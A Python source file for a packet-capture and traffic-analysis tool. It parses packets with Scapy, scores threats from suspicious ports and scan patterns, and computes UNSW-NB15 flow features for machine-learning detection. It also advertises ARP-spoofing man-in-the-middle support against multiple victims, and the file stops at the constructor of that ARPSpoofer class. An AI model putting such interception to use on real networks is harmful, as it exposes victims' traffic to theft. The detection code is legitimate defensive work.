"""
NetSentinel - Packet Capture & Analysis Engine
Captures live network packets using Scapy and extracts features for AI analysis.
NOW WITH FULL ARP SPOOFING (MITM) SUPPORT — MULTIPLE VICTIMS
"""

import time
import json
import threading
import queue
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from collections import defaultdict

try:
    from scapy.all import (
        sniff, IP, TCP, UDP, ICMP, DNS, ARP, Raw,
        Ether, IPv6, conf, srp, send, sendp, get_if_hwaddr, get_if_addr
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

import requests
import pandas as pd


# ─────────────────────────────────────────────
# IP Geolocation Cache
# ─────────────────────────────────────────────
class GeoLocator:
    """Lightweight IP geolocation using free ip-api.com with non-blocking lookups."""

    def __init__(self):
        self.cache = {}
        self._pending = set()
        self._executor = ThreadPoolExecutor(max_workers=2)
        self._session = requests.Session()
        self.private_ranges = [
            ("10.", "10.255.255.255"),
            ("172.16.", "172.31.255.255"),
            ("192.168.", "192.168.255.255"),
            ("127.", "127.255.255.255"),
        ]

    def is_private(self, ip: str) -> bool:
        for prefix, _ in self.private_ranges:
            if ip.startswith(prefix):
                return True
        return ip in ("0.0.0.0", "255.255.255.255", "::1", "::")

    def lookup(self, ip: str) -> dict:
        if self.is_private(ip):
            return {
                "country": "Local",
                "city": "Private Network",
                "isp": "Local",
                "lat": 0,
                "lon": 0,
                "org": "Private",
            }

        if ip in self.cache:
            return self.cache[ip]

        # Return placeholder immediately and resolve in background
        if ip not in self._pending:
            self._pending.add(ip)
            self._executor.submit(self._background_lookup, ip)

        return {
            "country": "Resolving...",
            "city": "",
            "isp": "",
            "lat": 0,
            "lon": 0,
            "org": "",
        }

    def _background_lookup(self, ip: str):
        fallback = {
            "country": "Unknown",
            "city": "Unknown",
            "isp": "Unknown",
            "lat": 0,
            "lon": 0,
            "org": "Unknown",
        }
        try:
            resp = self._session.get(
                f"http://ip-api.com/json/{ip}?fields=country,city,isp,lat,lon,org",
                timeout=2,
            )
            if resp.status_code == 200:
                self.cache[ip] = resp.json()
            else:
                self.cache[ip] = fallback
        except Exception:
            self.cache[ip] = fallback
        finally:
            self._pending.discard(ip)


# ─────────────────────────────────────────────
# Packet Parser (100% unchanged)
# ─────────────────────────────────────────────
class PacketParser:
    """Extracts structured info from raw Scapy packets."""
    WELL_KNOWN_PORTS = {
        20: "FTP-Data", 21: "FTP", 22: "SSH", 23: "Telnet",
        25: "SMTP", 53: "DNS", 67: "DHCP", 68: "DHCP",
        80: "HTTP", 110: "POP3", 119: "NNTP", 123: "NTP",
        143: "IMAP", 161: "SNMP", 194: "IRC", 443: "HTTPS",
        445: "SMB", 465: "SMTPS", 587: "SMTP", 993: "IMAPS",
        995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 3306: "MySQL",
        3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
        8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
        27017: "MongoDB",
    }

    SUSPICIOUS_PORTS = {
        4444, 5555, 6666, 6667, 31337, 12345, 54321,
        1234, 9999, 7777, 8888, 2222,
    }

    def __init__(self):
        self.geo = GeoLocator()

    # TCP flag bit names for Wireshark-like display
    TCP_FLAG_NAMES = {
        "F": "FIN", "S": "SYN", "R": "RST", "P": "PSH",
        "A": "ACK", "U": "URG", "E": "ECE", "C": "CWR",
    }

    # IP protocol numbers
    IP_PROTO_NAMES = {
        1: "ICMP", 2: "IGMP", 6: "TCP", 17: "UDP",
        41: "IPv6", 47: "GRE", 50: "ESP", 51: "AH",
        58: "ICMPv6", 89: "OSPF", 132: "SCTP",
    }

    def parse(self, packet) -> dict | None:
        """Parse a Scapy packet into a structured dictionary with full header dissection."""
        try:
            info = {
                "timestamp": datetime.now().isoformat(),
                "epoch": time.time(),
                "size": len(packet),
            }

            # ── Layer dissection for Wireshark-like view ──
            layers = []

            # Layer 2 - Ethernet / Data Link
            if packet.haslayer(Ether):
                info["src_mac"] = packet[Ether].src
                info["dst_mac"] = packet[Ether].dst
                eth_type = packet[Ether].type
                eth_type_name = {
                    0x0800: "IPv4", 0x0806: "ARP", 0x86DD: "IPv6",
                    0x8100: "802.1Q VLAN", 0x88CC: "LLDP",
                }.get(eth_type, f"0x{eth_type:04x}")
                layers.append({
                    "name": "Ethernet II",
                    "fields": {
                        "Destination MAC": packet[Ether].dst,
                        "Source MAC": packet[Ether].src,
                        "Type": f"{eth_type_name} (0x{eth_type:04x})",
                    }
                })

            # Layer 3 - IP
            if packet.haslayer(IP):
                ip = packet[IP]
                info["src_ip"] = ip.src
                info["dst_ip"] = ip.dst
                info["ttl"] = ip.ttl
                info["ip_version"] = 4
                info["protocol_num"] = ip.proto
                proto_name = self.IP_PROTO_NAMES.get(ip.proto, str(ip.proto))

                # IP flags
                ip_flags_list = []
                if ip.flags.DF:
                    ip_flags_list.append("Don't Fragment")
                if ip.flags.MF:
                    ip_flags_list.append("More Fragments")

                layers.append({
                    "name": "Internet Protocol Version 4",
                    "fields": {
                        "Version": 4,
                        "Header Length": f"{ip.ihl * 4} bytes",
                        "DSCP / ToS": f"0x{ip.tos:02x}",
                        "Total Length": ip.len,
                        "Identification": f"0x{ip.id:04x} ({ip.id})",
                        "Flags": ", ".join(ip_flags_list) if ip_flags_list else "None",
                        "Fragment Offset": ip.frag,
                        "TTL": ip.ttl,
                        "Protocol": f"{proto_name} ({ip.proto})",
                        "Header Checksum": f"0x{ip.chksum:04x}" if ip.chksum else "N/A",
                        "Source Address": ip.src,
                        "Destination Address": ip.dst,
                    }
                })

            elif packet.haslayer(IPv6):
                ip6 = packet[IPv6]
                info["src_ip"] = ip6.src
                info["dst_ip"] = ip6.dst
                info["ttl"] = ip6.hlim
                info["ip_version"] = 6
                info["protocol_num"] = ip6.nh
                proto_name = self.IP_PROTO_NAMES.get(ip6.nh, str(ip6.nh))
                layers.append({
                    "name": "Internet Protocol Version 6",
                    "fields": {
                        "Version": 6,
                        "Traffic Class": f"0x{ip6.tc:02x}",
                        "Flow Label": f"0x{ip6.fl:05x}",
                        "Payload Length": ip6.plen,
                        "Next Header": f"{proto_name} ({ip6.nh})",
                        "Hop Limit": ip6.hlim,
                        "Source Address": ip6.src,
                        "Destination Address": ip6.dst,
                    }
                })
            else:
                # ARP or other non-IP
                if packet.haslayer(ARP):
                    arp = packet[ARP]
                    info["src_ip"] = arp.psrc
                    info["dst_ip"] = arp.pdst
                    info["protocol"] = "ARP"
                    op_name = "Request" if arp.op == 1 else "Reply"
                    info["protocol_detail"] = f"ARP {op_name}"
                    layers.append({
                        "name": "Address Resolution Protocol",
                        "fields": {
                            "Hardware Type": f"Ethernet ({arp.hwtype})",
                            "Protocol Type": f"IPv4 (0x{arp.ptype:04x})",
                            "Hardware Size": arp.hwlen,
                            "Protocol Size": arp.plen,
                            "Opcode": f"{op_name} ({arp.op})",
                            "Sender MAC": arp.hwsrc,
                            "Sender IP": arp.psrc,
                            "Target MAC": arp.hwdst,
                            "Target IP": arp.pdst,
                        }
                    })
                    info["layers"] = layers
                    info["explanation"] = self._explain_arp(packet)
                    info["threat_level"] = "safe"
                    info["threat_score"] = 0.0
                    info["threat_flags"] = []
                    info["payload_size"] = 0
                    info["payload_hex"] = ""
                    info["payload_text"] = ""
                    return info
                return None

            # Layer 4 - Transport
            if packet.haslayer(TCP):
                tcp = packet[TCP]
                info["src_port"] = tcp.sport
                info["dst_port"] = tcp.dport
                info["protocol"] = "TCP"
                info["tcp_flags"] = str(tcp.flags)
                info["tcp_seq"] = tcp.seq
                info["tcp_ack"] = tcp.ack
                info["window_size"] = tcp.window
                service = self._get_service(tcp.sport, tcp.dport)
                info["service"] = service

                # Detailed TCP flags
                flag_str = str(tcp.flags)
                flag_names = [self.TCP_FLAG_NAMES.get(f, f) for f in flag_str]
                flags_display = ", ".join(flag_names) if flag_names else "None"

                # TCP options
                tcp_options = []
                try:
                    for opt_name, opt_val in tcp.options:
                        tcp_options.append(f"{opt_name}: {opt_val}")
                except Exception:
                    pass

                layer_fields = {
                    "Source Port": tcp.sport,
                    "Destination Port": tcp.dport,
                    "Sequence Number": tcp.seq,
                    "Acknowledgment Number": tcp.ack,
                    "Header Length": f"{tcp.dataofs * 4} bytes",
                    "Flags": f"{flags_display} ({flag_str})",
                    "Window Size": tcp.window,
                    "Checksum": f"0x{tcp.chksum:04x}" if tcp.chksum else "N/A",
                    "Urgent Pointer": tcp.urgptr,
                }
                if tcp_options:
                    layer_fields["Options"] = "; ".join(tcp_options)
                layers.append({"name": "Transmission Control Protocol", "fields": layer_fields})

            elif packet.haslayer(UDP):
                udp = packet[UDP]
                info["src_port"] = udp.sport
                info["dst_port"] = udp.dport
                # QUIC runs over UDP/443 — tag it so quic_ratio matches training
                if udp.sport == 443 or udp.dport == 443:
                    info["protocol"] = "QUIC"
                else:
                    info["protocol"] = "UDP"
                service = self._get_service(udp.sport, udp.dport)
                info["service"] = service
                layers.append({
                    "name": "User Datagram Protocol",
                    "fields": {
                        "Source Port": udp.sport,
                        "Destination Port": udp.dport,
                        "Length": udp.len,
                        "Checksum": f"0x{udp.chksum:04x}" if udp.chksum else "N/A",
                    }
                })

            elif packet.haslayer(ICMP):
                icmp = packet[ICMP]
                info["protocol"] = "ICMP"
                info["icmp_type"] = icmp.type
                info["icmp_code"] = icmp.code
                info["service"] = "ICMP"
                icmp_type_names = {
                    0: "Echo Reply", 3: "Destination Unreachable",
                    4: "Source Quench", 5: "Redirect",
                    8: "Echo Request", 11: "Time Exceeded",
                    12: "Parameter Problem", 13: "Timestamp Request",
                    14: "Timestamp Reply",
                }
                type_name = icmp_type_names.get(icmp.type, f"Type {icmp.type}")
                layers.append({
                    "name": "Internet Control Message Protocol",
                    "fields": {
                        "Type": f"{type_name} ({icmp.type})",
                        "Code": icmp.code,
                        "Checksum": f"0x{icmp.chksum:04x}" if icmp.chksum else "N/A",
                        "Identifier": getattr(icmp, "id", "N/A"),
                        "Sequence Number": getattr(icmp, "seq", "N/A"),
                    }
                })
            else:
                info["protocol"] = f"IP-{info.get('protocol_num', '?')}"
                info["service"] = "Other"

            # DNS layer
            if packet.haslayer(DNS):
                dns = packet[DNS]
                info["service"] = "DNS"
                dns_fields = {
                    "Transaction ID": f"0x{dns.id:04x}" if dns.id else "N/A",
                    "Flags": f"0x{dns.qr:01x}",
                    "Query/Response": "Response" if dns.qr else "Query",
                    "Opcode": dns.opcode,
                    "Questions": dns.qdcount,
                    "Answer RRs": dns.ancount,
                    "Authority RRs": dns.nscount,
                    "Additional RRs": dns.arcount,
                }
                try:
                    if dns.qd:
                        qname = dns.qd.qname.decode(errors="ignore")
                        info["dns_query"] = qname
                        dns_fields["Query Name"] = qname
                        dns_fields["Query Type"] = dns.qd.qtype
                        dns_fields["Query Class"] = dns.qd.qclass
                except Exception:
                    pass
                try:
                    if dns.an:
                        answers = []
                        an = dns.an
                        for _ in range(min(dns.ancount, 5)):
                            if an is None:
                                break
                            rdata = str(getattr(an, "rdata", ""))
                            answers.append(rdata)
                            an = an.payload if hasattr(an, "payload") and an.payload else None
                        if answers:
                            dns_fields["Answers"] = "; ".join(answers)
                except Exception:
                    pass
                layers.append({"name": "Domain Name System", "fields": dns_fields})

            info["layers"] = layers

            # Payload (store up to 1500 bytes for content viewer)
            if packet.haslayer(Raw):
                payload = bytes(packet[Raw].load)
                info["payload_size"] = len(payload)
                info["payload_preview"] = payload[:100].hex()
                info["payload_hex"] = payload[:1500].hex()
                try:
                    info["payload_ascii"] = payload[:100].decode("ascii", errors="replace")
                    info["payload_text"] = payload[:1500].decode("utf-8", errors="replace")
                except Exception:
                    info["payload_ascii"] = ""
                    info["payload_text"] = ""
            else:
                info["payload_size"] = 0
                info["payload_hex"] = ""
                info["payload_text"] = ""

            # Geolocation
            src_geo = self.geo.lookup(info.get("src_ip", "0.0.0.0"))
            dst_geo = self.geo.lookup(info.get("dst_ip", "0.0.0.0"))
            info["src_country"] = src_geo.get("country", "Unknown")
            info["src_city"] = src_geo.get("city", "Unknown")
            info["src_isp"] = src_geo.get("isp", "Unknown")
            info["src_lat"] = src_geo.get("lat", 0)
            info["src_lon"] = src_geo.get("lon", 0)
            info["dst_country"] = dst_geo.get("country", "Unknown")
            info["dst_city"] = dst_geo.get("city", "Unknown")
            info["dst_isp"] = dst_geo.get("isp", "Unknown")
            info["dst_lat"] = dst_geo.get("lat", 0)
            info["dst_lon"] = dst_geo.get("lon", 0)

            # Threat analysis
            threat = self._analyze_threat(info)
            info.update(threat)

            # Human-readable explanation
            info["explanation"] = self._generate_explanation(info)

            return info

        except Exception as e:
            return None

    def _get_service(self, sport: int, dport: int) -> str:
        if dport in self.WELL_KNOWN_PORTS:
            return self.WELL_KNOWN_PORTS[dport]
        if sport in self.WELL_KNOWN_PORTS:
            return self.WELL_KNOWN_PORTS[sport]
        return f"Port-{dport}"

    def _analyze_threat(self, info: dict) -> dict:
        threat_score = 0.0
        threat_flags = []

        dst_port = info.get("dst_port", 0)
        src_port = info.get("src_port", 0)
        if dst_port in self.SUSPICIOUS_PORTS or src_port in self.SUSPICIOUS_PORTS:
            threat_score += 0.4
            threat_flags.append("Suspicious port detected")

        tcp_flags = info.get("tcp_flags", "")
        if tcp_flags == "S":
            threat_score += 0.1
            threat_flags.append("SYN-only packet (potential scan)")

        if tcp_flags and all(f in tcp_flags for f in ["F", "P", "U"]):
            threat_score += 0.6
            threat_flags.append("XMAS scan detected (FIN+PSH+URG flags)")

        if info.get("protocol") == "TCP" and tcp_flags == "":
            threat_score += 0.5
            threat_flags.append("NULL scan detected (no TCP flags)")

        if tcp_flags == "F":
            threat_score += 0.4
            threat_flags.append("FIN scan detected")

        ttl = info.get("ttl", 64)
        if ttl and ttl < 5:
            threat_score += 0.2
            threat_flags.append(f"Very low TTL ({ttl}) - potential evasion")

        if info.get("payload_size", 0) > 1000 and dst_port not in (80, 443, 8080, 8443):
            threat_score += 0.15
            threat_flags.append("Large payload on non-standard port")

        dns_query = info.get("dns_query", "")
        if len(dns_query) > 60:
            threat_score += 0.3
            threat_flags.append("Unusually long DNS query (potential DNS tunneling)")

        if info.get("protocol") == "ICMP" and info.get("payload_size", 0) > 100:
            threat_score += 0.25
            threat_flags.append("ICMP with large payload (potential data exfiltration)")

        threat_score = min(threat_score, 1.0)

        if threat_score >= 0.6:
            threat_level = "high"
        elif threat_score >= 0.3:
            threat_level = "medium"
        elif threat_score > 0:
            threat_level = "low"
        else:
            threat_level = "safe"

        return {
            "threat_score": round(threat_score, 2),
            "threat_level": threat_level,
            "threat_flags": threat_flags,
        }

    def _explain_arp(self, packet) -> str:
        if packet[ARP].op == 1:
            return (
                f"ARP Request: Device at {packet[ARP].psrc} is asking "
                f"'Who has IP {packet[ARP].pdst}?' — This is normal network "
                f"behavior for resolving IP addresses to MAC addresses."
            )
        else:
            return (
                f"ARP Reply: Device at {packet[ARP].psrc} is responding with "
                f"its MAC address {packet[ARP].hwsrc} — Normal address resolution."
            )

    def _generate_explanation(self, info: dict) -> str:
        parts = []
        proto = info.get("protocol", "Unknown")
        service = info.get("service", "Unknown")
        src = info.get("src_ip", "?")
        dst = info.get("dst_ip", "?")
        src_country = info.get("src_country", "Unknown")
        dst_country = info.get("dst_country", "Unknown")
        src_port = info.get("src_port", "")
        dst_port = info.get("dst_port", "")

        src_label = f"{src} ({src_country})"
        dst_label = f"{dst} ({dst_country})"

        service_explanations = {
            "HTTP": "an unencrypted web request",
            "HTTPS": "an encrypted web connection (TLS/SSL)",
            "DNS": "a domain name lookup",
            "SSH": "a Secure Shell connection (remote access)",
            "FTP": "a file transfer",
            "FTP-Data": "an FTP data transfer",
            "SMTP": "an email being sent",
            "SMTPS": "an encrypted email being sent",
            "POP3": "email retrieval (POP3)",
            "IMAP": "email retrieval (IMAP)",
            "IMAPS": "encrypted email retrieval",
            "RDP": "a Remote Desktop connection",
            "SMB": "a Windows file sharing connection",
            "MySQL": "a MySQL database connection",
            "PostgreSQL": "a PostgreSQL database connection",
            "MongoDB": "a MongoDB database connection",
            "Redis": "a Redis cache connection",
            "VNC": "a VNC remote desktop connection",
            "NTP": "a time synchronization request",
            "DHCP": "a network configuration request (DHCP)",
            "ICMP": "a network diagnostic message (ping/traceroute)",
        }

        svc_desc = service_explanations.get(service, f"a {service} connection")

        if proto == "TCP":
            flags = info.get("tcp_flags", "")
            if "S" in flags and "A" not in flags:
                parts.append(f"📡 Connection attempt: {src_label}:{src_port} → {dst_label}:{dst_port}")
                parts.append(f"This is {svc_desc}. The source is initiating a TCP handshake (SYN).")
            elif "S" in flags and "A" in flags:
                parts.append(f"🤝 Handshake response: {dst_label}:{dst_port} → {src_label}:{src_port}")
                parts.append(f"The server is accepting the {service} connection (SYN-ACK).")
            elif "F" in flags:
                parts.append(f"👋 Connection closing: {src_label}:{src_port} → {dst_label}:{dst_port}")
                parts.append(f"A {service} connection is being terminated (FIN).")
            elif "R" in flags:
                parts.append(f"🚫 Connection reset: {src_label}:{src_port} → {dst_label}:{dst_port}")
                parts.append(f"The {service} connection was forcefully reset (RST).")
            else:
                parts.append(f"📦 Data transfer: {src_label}:{src_port} → {dst_label}:{dst_port}")
                parts.append(f"This is {svc_desc} carrying {info.get('payload_size', 0)} bytes of data.")

        elif proto == "UDP":
            parts.append(f"📨 {service} packet: {src_label}:{src_port} → {dst_label}:{dst_port}")
            if service == "DNS":
                dns_q = info.get("dns_query", "")
                if dns_q:
                    parts.append(f"DNS lookup for '{dns_q}' — Your device is resolving a domain name to an IP address.")
                else:
                    parts.append("A DNS response or query.")
            else:
                parts.append(f"This is {svc_desc} ({info.get('payload_size', 0)} bytes).")

        elif proto == "ICMP":
            icmp_types = {
                0: "Echo Reply (ping response)",
                3: "Destination Unreachable",
                5: "Redirect",
                8: "Echo Request (ping)",
                11: "Time Exceeded (traceroute)",
            }
            icmp_desc = icmp_types.get(info.get("icmp_type", -1), f"Type {info.get('icmp_type', '?')}")
            parts.append(f"🏓 ICMP: {src_label} → {dst_label}")
            parts.append(f"{icmp_desc} — {info.get('size', 0)} bytes.")

        else:
            parts.append(f"📡 {proto}: {src_label} → {dst_label}")
            parts.append(f"Size: {info.get('size', 0)} bytes.")

        if info.get("threat_flags"):
            parts.append(f"⚠️ Flags: {', '.join(info['threat_flags'])}")

        return " | ".join(parts)


# ─────────────────────────────────────────────
# Flow Aggregator — tracks real UNSW-NB15 features
# ─────────────────────────────────────────────
class FlowAggregator:
    """Groups packets into bidirectional flows and computes real features
    matching the UNSW-NB15 dataset for accurate ML prediction."""

    # UNSW-NB15 uses a sliding window of ~100 connections for ct_* features
    CT_WINDOW_SIZE = 100

    def __init__(self, timeout: float = 30.0):
        self.flows = {}
        self.timeout = timeout
        # Sliding window: store last N connection keys for ct_* counting
        self._recent_connections = []  # list of (service, src_ip, dst_ip, src_port, dst_port)
        self._connection_count = 0

    def _new_flow(self):
        return {
            "packet_count": 0,
            "total_bytes": 0,
            "start_time": None,
            "last_time": None,
            "src_ip": None,
            "dst_ip": None,
            "src_port": None,
            "dst_port": None,
            "protocol": None,
            "service": None,
            "flags_seen": set(),
            "ports_contacted": set(),
            # Per-direction stats for UNSW-NB15 features
            "spkts": 0,        # source-to-dest packet count
            "dpkts": 0,        # dest-to-source packet count
            "sbytes": 0,       # source-to-dest bytes
            "dbytes": 0,       # dest-to-source bytes
            "sttl_values": [],  # source TTL values
            "dttl_values": [],  # dest TTL values
            "swin": None,       # source TCP window
            "dwin": None,       # dest TCP window
            "stcpb": 0,        # source TCP base seq
            "dtcpb": 0,        # dest TCP base seq
            "packet_times_fwd": [],  # forward packet timestamps
            "packet_times_bwd": [],  # backward packet timestamps
            "trans_depth": 0,   # HTTP transaction depth
            "response_body_len": 0,
            "is_ftp_login": 0,
            "ct_flw_http_mthd": 0,
            "has_syn": False,
            "has_synack": False,
            "syn_time": None,
            "synack_time": None,
            "ack_time": None,
        }

    def get_flow_key(self, pkt_info: dict) -> str:
        src = pkt_info.get("src_ip", "?")
        dst = pkt_info.get("dst_ip", "?")
        proto = pkt_info.get("protocol", "?")
        sport = str(pkt_info.get("src_port", ""))
        dport = str(pkt_info.get("dst_port", ""))
        # Bidirectional: normalize so key is the same both ways
        if (src, sport) > (dst, dport):
            return f"{dst}:{dport}-{src}:{sport}-{proto}"
        return f"{src}:{sport}-{dst}:{dport}-{proto}"

    def _is_forward(self, pkt_info: dict, flow: dict) -> bool:
        """Check if packet goes in same direction as flow initiator."""
        return pkt_info.get("src_ip") == flow["src_ip"]

    def add_packet(self, pkt_info: dict):
        key = self.get_flow_key(pkt_info)
        now = time.time()

        if key not in self.flows:
            self.flows[key] = self._new_flow()

        flow = self.flows[key]

        if flow["start_time"] is None:
            flow["start_time"] = now
            flow["src_ip"] = pkt_info.get("src_ip")
            flow["dst_ip"] = pkt_info.get("dst_ip")
            flow["src_port"] = pkt_info.get("src_port")
            flow["dst_port"] = pkt_info.get("dst_port")
            flow["protocol"] = pkt_info.get("protocol")
            flow["service"] = pkt_info.get("service")

        flow["packet_count"] += 1
        flow["total_bytes"] += pkt_info.get("size", 0)
        flow["last_time"] = now

        # Direction-aware stats
        is_fwd = self._is_forward(pkt_info, flow)
        size = pkt_info.get("size", 0)
        ttl = pkt_info.get("ttl")

        if is_fwd:
            flow["spkts"] += 1
            flow["sbytes"] += size
            flow["packet_times_fwd"].append(now)
            if ttl is not None:
                flow["sttl_values"].append(ttl)
            win = pkt_info.get("window_size")
            if win and flow["swin"] is None:
                flow["swin"] = win
            seq = pkt_info.get("tcp_seq")
            if seq and flow["stcpb"] == 0:
                flow["stcpb"] = seq
        else:
            flow["dpkts"] += 1
            flow["dbytes"] += size
            flow["packet_times_bwd"].append(now)
            if ttl is not None:
                flow["dttl_values"].append(ttl)
            win = pkt_info.get("window_size")
            if win and flow["dwin"] is None:
                flow["dwin"] = win
            seq = pkt_info.get("tcp_seq")
            if seq and flow["dtcpb"] == 0:
                flow["dtcpb"] = seq

        # TCP handshake timing
        tcp_flags = pkt_info.get("tcp_flags", "")
        if "S" in tcp_flags and "A" not in tcp_flags and not flow["has_syn"]:
            flow["has_syn"] = True
            flow["syn_time"] = now
        elif "S" in tcp_flags and "A" in tcp_flags and not flow["has_synack"]:
            flow["has_synack"] = True
            flow["synack_time"] = now
        elif "A" in tcp_flags and flow["has_synack"] and flow["ack_time"] is None:
            flow["ack_time"] = now

        if "tcp_flags" in pkt_info:
            flow["flags_seen"].add(pkt_info["tcp_flags"])

        if "dst_port" in pkt_info:
            flow["ports_contacted"].add(pkt_info["dst_port"])

        # Service-specific
        service = pkt_info.get("service", "")
        if service in ("HTTP", "HTTPS"):
            flow["ct_flw_http_mthd"] += 1
            flow["trans_depth"] = max(flow["trans_depth"], 1)
        if service == "FTP" and pkt_info.get("payload_size", 0) > 0:
            flow["is_ftp_login"] = 1
        flow["response_body_len"] = max(
            flow["response_body_len"], pkt_info.get("payload_size", 0)
        )

        # Update sliding window for connection tracking
        self._connection_count += 1
        src_ip = pkt_info.get("src_ip", "")
        dst_ip = pkt_info.get("dst_ip", "")
        conn_entry = (service, src_ip, dst_ip,
                      pkt_info.get("src_port", 0), pkt_info.get("dst_port", 0))
        self._recent_connections.append(conn_entry)
        if len(self._recent_connections) > self.CT_WINDOW_SIZE:
            self._recent_connections = self._recent_connections[-self.CT_WINDOW_SIZE:]

    def get_flow_features(self, pkt_info: dict) -> dict:
        """Get real aggregated flow features for ML prediction.
        Returns feature dict matching UNSW-NB15 feature names."""
        key = self.get_flow_key(pkt_info)
        flow = self.flows.get(key)
        if not flow or flow["packet_count"] < 1:
            return None

        now = time.time()
        dur = max((flow["last_time"] or now) - (flow["start_time"] or now), 0.001)

        # Compute jitter (variance of inter-packet times)
        def _jitter(times):
            if len(times) < 2:
                return 0.0
            gaps = [times[i] - times[i-1] for i in range(1, len(times))]
            if not gaps:
                return 0.0
            mean_gap = sum(gaps) / len(gaps)
            return (sum((g - mean_gap) ** 2 for g in gaps) / len(gaps)) ** 0.5

        # Compute mean inter-packet time
        def _mean_pkt_time(times):
            if len(times) < 2:
                return 0.0
            gaps = [times[i] - times[i-1] for i in range(1, len(times))]
            return (sum(gaps) / len(gaps)) * 1000 if gaps else 0.0  # in ms

        sjit = _jitter(flow["packet_times_fwd"]) * 1000
        djit = _jitter(flow["packet_times_bwd"]) * 1000
        sinpkt = _mean_pkt_time(flow["packet_times_fwd"])
        dinpkt = _mean_pkt_time(flow["packet_times_bwd"])

        spkts = max(flow["spkts"], 1)
        dpkts = max(flow["dpkts"], 1)

        # TCP RTT from handshake
        tcprtt = 0.0
        synack_delta = 0.0
        ackdat_delta = 0.0
        if flow["syn_time"] and flow["synack_time"]:
            synack_delta = flow["synack_time"] - flow["syn_time"]
        if flow["synack_time"] and flow["ack_time"]:
            ackdat_delta = flow["ack_time"] - flow["synack_time"]
        tcprtt = synack_delta + ackdat_delta

        # Rate
        rate = flow["packet_count"] / dur if dur > 0 else 0

        # Load (bits per second)
        sload = (flow["sbytes"] * 8) / dur if dur > 0 else 0
        dload = (flow["dbytes"] * 8) / dur if dur > 0 else 0

        # Loss (estimate: if only SYNs and no data, likely retransmissions)
        sloss = 0
        dloss = 0

        # Mean packet size
        smean = flow["sbytes"] / spkts if spkts > 0 else 0
        dmean = flow["dbytes"] / dpkts if dpkts > 0 else 0

        # Connection tracking from sliding window (matches UNSW-NB15 methodology)
        src_ip = flow["src_ip"] or ""
        dst_ip = flow["dst_ip"] or ""
        service = flow["service"] or ""
        f_sport = flow.get("src_port", 0)
        f_dport = flow.get("dst_port", 0)

        # Count occurrences in the sliding window
        ct_srv_src = ct_srv_dst = ct_dst_ltm = ct_src_ltm = 0
        ct_src_dport = ct_dst_sport = ct_dst_src = 0
        for (c_svc, c_src, c_dst, c_sport, c_dport) in self._recent_connections:
            if c_svc == service and c_src == src_ip:
                ct_srv_src += 1
            if c_svc == service and c_dst == dst_ip:
                ct_srv_dst += 1
            if c_dst == dst_ip:
                ct_dst_ltm += 1
            if c_src == src_ip:
                ct_src_ltm += 1
            if c_src == src_ip and c_dport == f_dport:
                ct_src_dport += 1
            if c_dst == dst_ip and c_sport == f_sport:
                ct_dst_sport += 1
            if c_dst == dst_ip and c_src == src_ip:
                ct_dst_src += 1

        # ct_state_ttl: connections with same state (protocol) and similar TTL
        sttl_val = flow["sttl_values"][-1] if flow["sttl_values"] else 64
        ct_state_ttl = sum(
            1 for (c_svc, *_rest) in self._recent_connections
            if c_svc == service
        )
        ct_state_ttl = min(ct_state_ttl, 6)  # typical range in dataset is 0-6

        features = {
            "dur": dur,
            "spkts": flow["spkts"],
            "dpkts": flow["dpkts"],
            "sbytes": flow["sbytes"],
            "dbytes": flow["dbytes"],
            "rate": rate,
            "sttl": sttl_val,
            "dttl": flow["dttl_values"][-1] if flow["dttl_values"] else 62,
            "sload": sload,
            "dload": dload,
            "sloss": sloss,
            "dloss": dloss,
            "sinpkt": sinpkt,
            "dinpkt": dinpkt,
            "sjit": sjit,
            "djit": djit,
            "swin": flow["swin"] or 255,
            "stcpb": flow["stcpb"],
            "dtcpb": flow["dtcpb"],
            "dwin": flow["dwin"] or 255,
            "tcprtt": tcprtt,
            "synack": synack_delta,
            "ackdat": ackdat_delta,
            "smean": smean,
            "dmean": dmean,
            "trans_depth": flow["trans_depth"],
            "response_body_len": flow["response_body_len"],
            "ct_srv_src": ct_srv_src,
            "ct_state_ttl": ct_state_ttl,
            "ct_dst_ltm": ct_dst_ltm,
            "ct_src_dport_ltm": ct_src_dport,
            "ct_dst_sport_ltm": ct_dst_sport,
            "ct_dst_src_ltm": ct_dst_src,
            "ct_src_ltm": ct_src_ltm,
            "ct_srv_dst": ct_srv_dst,
            "is_sm_ips_ports": 1 if (src_ip == dst_ip and f_sport == f_dport) else 0,
            "ct_flw_http_mthd": flow["ct_flw_http_mthd"],
            "is_ftp_login": flow["is_ftp_login"],
        }
        return features

    def detect_anomalies(self) -> list:
        anomalies = []
        now = time.time()
        for key, flow in self.flows.items():
            if len(flow["ports_contacted"]) > 10:
                anomalies.append({
                    "type": "Port Scan",
                    "severity": "high",
                    "flow_key": key,
                    "detail": f"{flow['src_ip']} contacted {len(flow['ports_contacted'])} different ports on {flow['dst_ip']}",
                    "ports": len(flow["ports_contacted"]),
                })

            duration = (flow["last_time"] or now) - (flow["start_time"] or now)
            if duration > 0 and flow["packet_count"] / duration > 100:
                anomalies.append({
                    "type": "High Traffic Rate",
                    "severity": "medium",
                    "flow_key": key,
                    "detail": f"{flow['packet_count']:.0f} packets in {duration:.1f}s ({flow['packet_count']/duration:.0f} pkt/s) from {flow['src_ip']} to {flow['dst_ip']}",
                })

            if flow["flags_seen"] == {"S"} and flow["packet_count"] > 20:
                anomalies.append({
                    "type": "SYN Flood",
                    "severity": "high",
                    "flow_key": key,
                    "detail": f"{flow['packet_count']} SYN-only packets from {flow['src_ip']} to {flow['dst_ip']} — potential SYN flood attack",
                })
        return anomalies

    def get_summary(self) -> dict:
        total_flows = len(self.flows)
        total_packets = sum(f["packet_count"] for f in self.flows.values())
        total_bytes = sum(f["total_bytes"] for f in self.flows.values())
        protocols = defaultdict(int)
        for f in self.flows.values():
            protocols[f["protocol"]] += f["packet_count"]

        return {
            "total_flows": total_flows,
            "total_packets": total_packets,
            "total_bytes": total_bytes,
            "protocols": dict(protocols),
        }


# ─────────────────────────────────────────────
# ARP Spoofer (MITM) — FIXED FOR MULTIPLE VICTIMS
# ─────────────────────────────────────────────
class ARPSpoofer:
    """Full ARP Spoofing engine for Man-in-the-Middle attacks. Supports multiple victims."""

    def __init__(self, interface: str = None):
        self.interface = interface or conf.iface
        self.is_spoofing = False
        self.spoof_thread = None
        self.victim_ips = []
        self.victim_macs = {}
